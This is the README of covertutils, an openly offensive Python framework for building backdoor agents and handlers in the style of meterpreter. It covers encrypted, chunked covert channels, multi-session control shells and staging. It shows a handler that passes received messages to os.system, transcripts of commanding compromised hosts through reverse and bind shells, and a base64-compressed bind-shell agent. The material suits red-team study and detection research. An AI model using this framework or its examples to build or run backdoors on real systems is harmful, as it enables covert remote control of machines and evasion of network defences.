# covertutils
## A framework for Backdoor development!

[![Documentation Status](https://readthedocs.org/projects/covertutils/badge/?version=latest)](http://covertutils.readthedocs.io/en/latest/?badge=latest) [![PyPI version](https://badge.fury.io/py/covertutils.svg)](https://pypi.python.org/pypi/covertutils)          [![GitHub version](https://badge.fury.io/gh/operatorequals%2Fcovertutils.svg)](https://github.com/operatorequals/covertutils) [![Build Status](https://travis-ci.org/operatorequals/covertutils.svg?branch=master)](https://travis-ci.org/operatorequals/covertutils)

[Documentation Page](https://covertutils.readthedocs.io)

[Blog Post in Securosophy describing some internals](https://securosophy.com/2017/04/22/reinventing-the-wheel-for-the-last-time-the-covertutils-package/)

[Arranged Con Presentation about the Package 
(DefCamp #8 | November 9-10)](https://def.camp/speaker/john-torakis/)

[ - Defcamp #8 Presentation PDF available - ](https://github.com/operatorequals/presentations/blob/master/defcamp08_10112017_covertutils_presentation.pdf)
### What is it?


This Python package is used to create Agent/Handler backdoors, like *metasploit's* `meterpreter`, *empire's* `empire agent`, *cobalt strike's* `beacon` and so on...

It automatically handles all communication channel options, like **encryption**, **chunking**, **steganography**, **sessions**, etc. [With a recent package addition (`httpimport`), staging from pure Python2/3 is finally possible!](http://covertutils.readthedocs.io/en/latest/staging_exec.html)

With all those set with a few lines of code, a programmer can spend time creating the *actual payloads*, *persistense mechanisms*, *shellcodes* and generally **more creative stuff!**!

The security programmers can stop *re-inventing the wheel* by implementing encryption mechanisms both *Agent-side* and *Handler-side* to spend their time developing more versatile *Agents*, and generally feature-rich shells!

### Python?
Yes, *Python*! Developer friendly, popular among security folks, consistent, preinstalled in vast majority of \*nix machines and easily packed into Windows PE files.
So it is Python, and more specifically **Python2.7** only, for the time being...

### But why Python2?
Several reasons. Mostly because Python2 is **more popular among devices** (*IoT devices*, *old Linux servers*, etc), and backdoor code could run *as-is* on them, without `Freezing`, `Packing`, `PyInstalling`, etc. Backdoors are valuable when they are as cross-platform as possible.
Macs, for example, do not have Python3 installed by default. If you want ``covertutils`` in Python3, do not complain, read [this reddit flame war dodging](https://www.reddit.com/r/netsec/comments/6rj7b0/a_python_package_for_creating_backdoors_coverutils/) and start PRing...

#### So far the `covertutils.crypto` subpackage has been ported to Python3. That means that all encryption and signing can work from Python3. Slow and steady...

### Dependencies?
NO! Absolutely no dependencies, only pure python built-ins! The `entropy` package is required for the `tests` though.
This is a package's requirement, to ensure good flow when compiling in executable binaries.


# Summary

## The Entities

### The `Message`
Messages are all things that mean something to the listener. Messages travel through communication channels, and they have to be unaware of the channel they are travelling in. In other words, messages have to be independent of the mean of their transportation.
 *  If the communication channel can handle low length byte-chunks per "burst", the message has to be chunked.
 *  If the communication channel filters certain byte arrays (IDS/IPS, NextGen Firewalls).
 

### The `Stream`
The Stream is a tag that gives certain context to the message. Can be defined and used for arbitrary reasons. Streams, for example, can be used to separate `Shell Commands` from `shellcode` messages.

## The Organizers

### The `Orchestrator`
Orchestrators are the core of data manipulation in `covertutils`. They handle all data transformation methods to translate raw chunks of data into Stream-Message pairs.

### The `Handler`
Handlers tie together the raw byte input/output with the `orchestrators` to provide an interface of:
* `onChunk()`
* `onMessage()`
* `onNotRecognized()`

#### Example :
```python
def onMessage( message, stream ) :
  if stream == 'shell' :
    os.system( message )
```

### The `Shell`
A shell interface with prompt and `stream` control can be spawned from a `Handler` instance with:
``` python

shell = StandardShell(handler, prompt = "(%s:%d)> " % client_addr )
shell.start()
```
```bash
(127.0.0.5:8081)> 
# <Ctrl-C>
Available Streams:
	[ 0] - control
	[ 1] - python
	[ 2] - os-shell
	[99] - Back
Select stream: 2
[os-shell]> uname -a
Linux hostname 4.9.0-kali4-amd64 #1 SMP Debian 4.9.25-1kali1 (2017-05-04) x86_64 GNU/Linux
[os-shell]> !control sysinfo
General:
	Host: hostname
	Machine: x86_64
	Version: #1 SMP Debian 4.9.25-1kali1 (2017-05-04)
	Locale: en_US-UTF-8
	Platform: Linux-4.9.0-kali4-amd64-x86_64-with-Kali-kali-rolling-kali-rolling
	Release: 4.9.0-kali4-amd64
	System: Linux
	Processor: 
	User: unused

Specifics:
	Windows: ---
	Linux: glibc-2.7

[os-shell]> 
# <Ctrl-C>
(127.0.0.5:8081)> q
[!]	Quit shell? [y/N] y
Aborted by the user...

```

### Multiple `Sessions`? Meet `covertpreter`...
Any similarities with existing backdoors is purely coincidental...
``` bash
covertpreter> session -l
	Current Sessions:
0) 9cb04c9761938349 - <class '__main__.MyHandler'>
System Info: N/A

1) 523aff25b3703ac0 - <class '__main__.MyHandler'>
System Info: N/A

covertpreter> 523aff25b3703ac0 os-shell id
'!os-shell id' -> <523aff25b3703ac0>
uid=1000(unused) gid=1000(unused) groups=1000(unused)

covertpreter> control sysinfo
No sessions selected, ALL sessions will be commanded
Are you sure? [y/N]: y
'!control sysinfo' -> <9cb04c9761938349>
'!control sysinfo' -> <523aff25b3703ac0>
covertpreter> 
[...]
covertpreter> handler add examples/tcp_reverse_handler.py 8080 Pa55phra531
covertpreter>
Accepting			# non-blocking
Accepted
<covertutils.shells.impl.extendableshell.ExtendableShell instance at 0x7fe24c0e6dd0>
Added Session!

covertpreter> session -lv		# -v is verbose: shows available streams/extensions per handler
	Current Sessions:
0) 9cb04c9761938349 - <class '__main__.MyHandler'>
hostname - Linux-4.12.0-kali1-amd64-x86_64-with-Kali-kali-rolling-kali-rolling - en_US-UTF-8 - unused
	-> control
	-> python
	-> os-shell

1) 0d415f6ba85c604d - <class 'MyHandler'>
System Info: N/A
	-> control
	-> python
	-> os-shell
	-> file
	-> stage

2) 523aff25b3703ac0 - <class '__main__.MyHandler'>
hostname - Linux-4.12.0-kali1-amd64-x86_64-with-Kali-kali-rolling-kali-rolling - en_US-UTF-8 - unused
	-> control
	-> python
	-> os-shell

covertpreter>
```
Full documentation at [`covertpreter` Session Shell aggregator](http://covertutils.readthedocs.io/en/latest/shells.html#the-covertpreter-session-shell-aggregator)

### The `Encryption Schemes`
Custom _Stream Ciphers_ are used, designed and implemented from scratch in the `covertutils.crypto` subpackage. Currently a custom _scrambling_ function (`std`) and the standard `CRC32` (`crc`) functions are used to generate the _stream keys_.

The crypto and scrambling algorithms can be tried in the below CLI implementations:

#### Scrambling
``` bash
$ python -m covertutils.crypto.algorithms --length 16 std message_to_digest
f3c7de5e591d2eb7fba938847430e2c0
$ python -m covertutils.crypto.algorithms --length 20 std message_to_digest
413928828205d7af0a5f415f6c0a5014e49c7250
$ python -m covertutils.crypto.algorithms std message_to_digest --length 31
6d9dd92f9eada2611c04a29da18b8b845638aec85d0783617f51dfc72e62ae
$ python -m covertutils.crypto.algorithms std message_to_digest --length 32 --cycles 10
252f9b7175399bae1cb2b02c36f4dbefd5ae6d4971b10f16b25631e45a4efc6c
$ python -m covertutils.crypto.algorithms std message_to_digest --length 32 --cycles 20
4fd94b21d6ee742e7426de512d1565bf1dd1031a1aa9ddd9de263773cfc8888c
$ python -m covertutils.crypto.algorithms std message_to_digest
4fd94b21d6ee742e7426de512d1565bf1dd1031a1aa9ddd9de263773cfc8888c
```

#### Encryption/Decryption
``` bash
$ python -m covertutils.crypto.keys crc keyphrase message_to_encrypt --output b64
SkonjSa1pat95PVhAG9U3DHO
$
$ python -m covertutils.crypto.keys crc keyphrase SkonjSa1pat95PVhAG9U3DHO --input b64 --decrypt
message_to_encrypt
$ #	Change the keyphrase and try to decrypt:
$ python -m covertutils.crypto.keys crc keyphrase2 SkonjSa1pat95PVhAG9U3DHO --input b64 --decrypt
����R��M8�A�q�/�
```
**The `std` algorithm is used by default in all communications.**

#### A primitive `signing` implementation
*Scrambling* the `examples/http_reverse_agent.py` file and later encrypting the scramble with a *key* creates something like a *signature*. The encrypted scramble can be used for integrity checking.
#### `Signing`
```bash
$ cat examples/http_reverse_agent.py | python -m covertutils.crypto.algorithms std - --length 16 | python -m covertutils.crypto.keys std "shared_secret" - -o b64
FiPXldUde7G4PGX3TnG+uBuviBVKSw+IS0D/i7S+REht
```
#### `Verifying`
``` bash 
signature="$(cat examples/http_reverse_agent.py | python -m covertutils.crypto.algorithms std - --length 16 | python -m covertutils.crypto.keys std "shared_secret" - -o b64)"
if [ "$signature" = "FiPXldUde7G4PGX3TnG+uBuviBVKSw+IS0D/i7S+REht" ]; then
	echo "Verified!";
else
	echo "Invalid.";
fi
```
(Try changing the `examples/http_reverse_agent.py` file or the `signature` variable to test the example)

*Signing is **not an overly secure feature**. It is little technique ensuring **basic** integrity checking without the hassle of importing official algorithms like `HMAC`* (which are definetely better, but *not built-in*). 
It is meant for *staging payload* verification, yet there is no such mechanism implemented by default.

### The `Compression`
All communications are passed through a layer of compression using the `bz2` or `zip` algorithm. The compression is using a *best effort* approach, meaning that the returned data will be the least lengthy compressed version of the input (even if that means that *no compression will take place*).
``` bash
$ cat examples/tcp_bind_agent.py | python -m covertutils.datamanipulation.compressor -  -v -o b64
eJydU01v2zAMPVu/gksuNhA4aQdfBuzQdR02DG2HJbdhSFWbiYTIkkExCfLvR9lu0qE7DQIkUeTjxyM1fTffR5o/Wz9Hf4DuxCZ4taHQQh0OSLxn62JptG8cUixt2zmQLRDDkuVVU7M06NzXweItNFBtMDJptsGfockPPp5VgZQaVfEUz9dQ75AHl2xbfEFHh9ip4d3oaJx9PquMrq6ulep0jJ0hHRE+wuSHrqokVe+vJko3DaXHRdmvyQys51zClpq2h19XvwulohgM0cvhyEfp5sv628PdavaiXT7efl8vVz/vbu6LbKpiKUw2OfQxiiybQs+L9Vt4QD4G2slVrJyNjD6vehNBYIeyeXYnCJvX9Cl1NNYhrGiP8CFZ3+udEMEwuIAnIx14UlntrOBnMJzrsUipqa6x47wP9MlJ0ikXNgittl4uhLpRKmtwA4T1AfJiCHMrCkY4ku46aTxsAoG/lJBlhLwnP8YrEzaHagHF6Cxi4oH0Ef7P4Su8eExDJOW8HZscLp2eAevt2qHfcjK+nkHY80WuFqnTf8uEwnQ/I4lgYe9Up2attdsGsmzaxGE/UpJGNv6ClMg/Rj/vCZz1lUvolHFxqTtRPhrCZ42t/IXVQP4fHvEtgg==
Ratio 52 %
```
```bash
$ echo -n eJydU01v2zAMPVu/gksuNhA4aQdfBuzQdR02DG2HJbdhSFWbiYTIkkExCfLvR9lu0qE7DQIkUeTjxyM1fTffR5o/Wz9Hf4DuxCZ4taHQQh0OSLxn62JptG8cUixt2zmQLRDDkuVVU7M06NzXweItNFBtMDJptsGfockPPp5VgZQaVfEUz9dQ75AHl2xbfEFHh9ip4d3oaJx9PquMrq6ulep0jJ0hHRE+wuSHrqokVe+vJko3DaXHRdmvyQys51zClpq2h19XvwulohgM0cvhyEfp5sv628PdavaiXT7efl8vVz/vbu6LbKpiKUw2OfQxiiybQs+L9Vt4QD4G2slVrJyNjD6vehNBYIeyeXYnCJvX9Cl1NNYhrGiP8CFZ3+udEMEwuIAnIx14UlntrOBnMJzrsUipqa6x47wP9MlJ0ikXNgittl4uhLpRKmtwA4T1AfJiCHMrCkY4ku46aTxsAoG/lJBlhLwnP8YrEzaHagHF6Cxi4oH0Ef7P4Su8eExDJOW8HZscLp2eAevt2qHfcjK+nkHY80WuFqnTf8uEwnQ/I4lgYe9Up2attdsGsmzaxGE/UpJGNv6ClMg/Rj/vCZz1lUvolHFxqTtRPhrCZ42t/IXVQP4fHvEtgg==\
| python -m covertutils.datamanipulation.compressor - -i b64 -d
#!/usr/bin/env python
from covertutils.handlers.impl import StandardShellHandler
from covertutils.orchestration import SimpleOrchestrator

import sys
import socket
[...]
```

## Networking
Networking is not handled by `covertutils`, as python provides great built-in networking API (directly inherited from C). The only requirements for ``covertutils`` `Handler` instances are **2 functions wrapping the raw data sending and receiving**.

Just pass a `send( raw )` and a `recv()` function to a `Handler` and you have a working *One-Time-Pad* encrypted, bandwidth aware, protocol independent, *password protected*, *multi-usable* channel.

# Further Examples:
Sample TCP/UDP Reverse Shells and TCP Bind Shell scripts can be found in `examples/` directory.

Tutorial and explanation of the architecture can be found in the [CovertUtils Tutorial Restaurant](http://covertutils.readthedocs.io/en/latest/assembling_backdoor.html)!


# Pull Requests?
Certainly! All pull requests that are tested and do not break the existing tests will be accepted!
Especially Pull Requests towards Python2/Python3 compatibility will be greatly appreciated!




# Disclaimer
Usage of ``covertutils`` for attacking infrastructures without prior mutual consistency can be considered as an illegal activity. It is the final user's responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this package.
